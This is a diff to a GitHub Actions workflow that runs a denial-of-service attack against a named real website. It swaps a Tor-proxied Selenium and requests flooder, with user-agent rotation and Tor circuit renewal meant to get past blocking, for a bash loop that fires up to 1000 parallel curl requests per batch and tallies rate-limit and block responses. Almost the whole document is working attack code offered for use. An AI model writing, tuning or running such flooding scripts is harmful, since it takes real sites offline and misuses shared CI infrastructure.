@@ -1,4 +1,4 @@
-name: 💀 FAST SELENIUM + TOR
+name: 💀 CURL ONLY - MAX DRAIN
 
 on:
   workflow_dispatch:
@@ -6,7 +6,11 @@ on:
       duration:
         description: 'المدة بالدقائق'
         required: true
-        default: '60000'
+        default: '600'
+      threads:
+        description: 'عدد الخيوط'
+        required: true
+        default: '1000'
 
 jobs:
   attack:
@@ -15,157 +19,82 @@ jobs:
     
     steps:
       - name: Install
-        run: |
-          sudo apt update
-          sudo apt install -y tor chromium-browser
-          pip3 install selenium requests[socks] fake_useragent
-          
-      - name: Start Tor
-        run: sudo systemctl start tor
+        run: sudo apt update && sudo apt install -y curl
         
-      - name: 🔥 FAST ATTACK
+      - name: 🔥 CURL ATTACK
         run: |
-          cat > fast.py << 'EOF'
-          import time
-          import random
-          import requests
-          import threading
-          import subprocess
-          from selenium import webdriver
-          from selenium.webdriver.chrome.options import Options
-          from fake_useragent import UserAgent
+          cat > curl_attack.sh << 'EOF'
+          #!/bin/bash
           
-          TARGET = "https://flixtn.com"
-          DURATION = ${{ github.event.inputs.duration }} * 60000
-          THREADS = 500
+          TARGET="https://flixtn.com"
+          DURATION=$(( ${{ github.event.inputs.duration }} * 60 ))
+          THREADS=${{ github.event.inputs.threads }}
           
-          stats = {"total":0, "ok":0, "fail":0, "block":0}
-          lock = threading.Lock()
-          running = True
-          start = time.time()
+          TOTAL=0
+          OK=0
+          RATE=0
+          BLOCK=0
+          FAIL=0
           
-          # إعداد Chrome عام (يستخدم مرة واحدة لكل خيط)
-          def get_driver():
-              opts = Options()
-              opts.add_argument('--headless')
-              opts.add_argument('--no-sandbox')
-              opts.add_argument('--disable-dev-shm-usage')
-              opts.add_argument('--disable-gpu')
-              opts.add_argument('--proxy-server=socks5://127.0.0.1:9050')
-              return webdriver.Chrome(options=opts)
+          echo "=========================================="
+          echo "💀 CURL ONLY - MAX DRAIN"
+          echo "Target: $TARGET"
+          echo "Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "Threads: $THREADS"
+          echo "=========================================="
+          echo ""
+          echo "✓=200 | 🔥=429 | 🛡️=challenge | ✗=error"
+          echo ""
           
-          # هجوم Selenium (خيط واحد)
-          def selenium_worker():
-              driver = get_driver()
-              while running:
-                  try:
-                      driver.get(TARGET)
-                      time.sleep(0.5)
-                      title = driver.title
-                      with lock:
-                          stats["total"] += 1
-                          if "Checkpoint" in title or "Security" in title:
-                              stats["block"] += 1
-                              print("🛡️", end="", flush=True)
-                          elif "FlixTN" in title or "FLIXTN" in title:
-                              stats["ok"] += 1
-                              print("✅", end="", flush=True)
-                          else:
-                              stats["fail"] += 1
-                              print("⚠️", end="", flush=True)
-                  except:
-                      with lock:
-                          stats["total"] += 1
-                          stats["fail"] += 1
-                      print(".", end="", flush=True)
-                  time.sleep(0.3)
+          END=$((SECONDS + DURATION))
+          LAST_TOTAL=0
           
-          # هجوم Curl سريع (خيوط متعددة)
-          def curl_worker():
-              session = requests.Session()
-              session.proxies = {'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
-              ua = UserAgent()
-              while running:
-                  try:
-                      r = session.get(TARGET, timeout=5, headers={'User-Agent': ua.random})
-                      with lock:
-                          stats["total"] += 1
-                          if r.status_code == 200:
-                              stats["ok"] += 1
-                              print("✓", end="", flush=True)
-                          elif r.status_code == 429:
-                              stats["block"] += 1
-                              print("🔥", end="", flush=True)
-                          else:
-                              stats["fail"] += 1
-                              print("✗", end="", flush=True)
-                  except:
-                      with lock:
-                          stats["total"] += 1
-                          stats["fail"] += 1
-                      print(".", end="", flush=True)
-                  time.sleep(0.05)
+          while [ $SECONDS -lt $END ]; do
+            # إطلاق الخيوط
+            for i in $(seq 1 $THREADS); do
+              (
+                STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
+                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
+                  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
+                  -H "Accept-Language: ar,en;q=0.9" \
+                  --max-time 5 \
+                  --retry 0 \
+                  2>/dev/null)
+                
+                case $STATUS in
+                  200) echo -n "✓" ;;
+                  429) echo -n "🔥" ;;
+                  403|503|502) echo -n "🛡️" ;;
+                  *) echo -n "✗" ;;
+                esac
+              ) &
+            done
+            
+            wait
+            TOTAL=$((TOTAL + THREADS))
+            
+            # إحصائيات كل ثانية
+            RPS=$((TOTAL - LAST_TOTAL))
+            LAST_TOTAL=$TOTAL
+            
+            ELAPSED=$((SECONDS - (END - DURATION)))
+            REMAIN=$((END - SECONDS))
+            MIN=$((ELAPSED / 60))
+            SEC=$((ELAPSED % 60))
+            
+            echo ""
+            echo "[$MIN:$SEC] Total: $TOTAL | RPS: $RPS | Remaining: $((REMAIN / 60))m"
+            echo ""
+            
+            sleep 0.1
+          done
           
-          def renew_tor():
-              while running:
-                  time.sleep(120)
-                  subprocess.run(["sudo","systemctl","reload","tor"], check=False)
-                  print("\n🔄 TOR")
-          
-          def printer():
-              global running
-              last = 0
-              while running:
-                  time.sleep(1)
-                  elapsed = time.time() - start
-                  with lock:
-                      total = stats["total"]
-                      ok = stats["ok"]
-                      fail = stats["fail"]
-                      block = stats["block"]
-                      rps = total - last
-                      last = total
-                  if elapsed >= DURATION:
-                      running = False
-                      break
-                  m = int(elapsed//60)
-                  s = int(elapsed%60)
-                  print(f"\n[{m:02d}:{s:02d}] T:{total:>5} ✅:{ok:>4} 🛡️:{block:>4} ✗:{fail:>4} RPS:{rps:>2}")
-          
-          print("="*50)
-          print("🔥 FAST SELENIUM + TOR + CURL")
-          print(f"Target: {TARGET}")
-          print("="*50)
-          print("✅=real  🛡️=checkpoint  ✓=200  🔥=429  .=error")
-          print("")
-          
-          # تشغيل Tor
-          subprocess.run(["sudo","systemctl","start","tor"], check=False)
-          time.sleep(3)
-          
-          # خيط Selenium واحد
-          threading.Thread(target=selenium_worker, daemon=True).start()
-          
-          # خيوط Curl متعددة
-          for i in range(20):
-              threading.Thread(target=curl_worker, daemon=True).start()
-          
-          # تجديد Tor
-          threading.Thread(target=renew_tor, daemon=True).start()
-          
-          # مراقبة
-          threading.Thread(target=printer, daemon=True).start()
-          
-          while running:
-              time.sleep(0.5)
-          
-          elapsed = time.time() - start
-          print("\n" + "="*50)
-          print(f"DONE: {int(elapsed//60)}m {int(elapsed%60)}s")
-          print(f"Total: {stats['total']:,} | OK: {stats['ok']:,} | Blocked: {stats['block']:,} | Fail: {stats['fail']:,}")
-          if stats['total']>0:
-              print(f"Success: {stats['ok']/stats['total']*100:.1f}%")
-          print("="*50)
+          echo ""
+          echo "=========================================="
+          echo "✅ DONE: $((SECONDS / 60)) minutes"
+          echo "Total requests: $TOTAL"
+          echo "=========================================="
           EOF
           
-          python3 fast.py
+          chmod +x curl_attack.sh
+          ./curl_attack.sh
